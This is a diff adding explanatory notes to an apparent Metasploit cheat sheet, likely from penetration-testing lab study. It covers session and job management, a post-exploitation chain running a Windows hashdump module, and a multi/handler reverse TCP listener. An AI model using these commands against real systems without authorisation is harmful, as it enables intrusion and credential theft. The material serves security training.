@@ -28,6 +28,7 @@ msf6 > sessions
 #   --  ----  ----                     -----------                 ----------
 #   1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501
 ```
+> Shows all active sessions with their ID, type, user context, and connection info. Note the session ID — you'll need it to interact, kill, or target with post modules.
 
 ### Interact with a Session
 
@@ -36,6 +37,7 @@ msf6 > sessions -i 1
 # [*] Starting interaction with 1...
 meterpreter >
 ```
+> `-i` followed by the session ID resumes interaction. Replace `1` with the ID from `sessions`. Returns you to the Meterpreter or shell prompt for that session.
 
 ### Kill a Session
 
@@ -43,6 +45,7 @@ meterpreter >
 msf6 > sessions -k 1      # Kill session by ID
 msf6 > sessions -K        # Kill ALL sessions
 ```
+> `-k <id>` kills one session cleanly. `-K` (capital) kills all sessions at once. Use with care during multi-target engagements.
 
 ---
 
@@ -67,6 +70,7 @@ msf6 post(windows/gather/hashdump) > run
 # 5. Switch back to original session
 msf6 > sessions -i 1
 ```
+> The standard post-exploitation chain: exploit → background → load post module → set SESSION → run → return to session. Replace `1` with your actual session ID from `sessions`.
 
 ### Common Post-Exploitation Module Types
 
@@ -89,6 +93,7 @@ msf6 exploit(multi/handler) > exploit -j
 # [*] Exploit running as background job 0.
 # [*] Started reverse TCP handler on 10.10.14.34:4444
 ```
+> `-j` runs the module as a background job so you keep the console free. Essential for `multi/handler` — the listener stays open while you do other things.
 
 ### Key `exploit` / `run` Flags
 
@@ -110,6 +115,7 @@ msf6 > jobs -l
 #  --  ----                    -------                    ------------
 #  0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
 ```
+> `-l` lists all running background jobs with their ID, module name, and payload. Use the job ID with `jobs -k <id>` to stop a specific listener.
 
 ### Job Management Commands
 
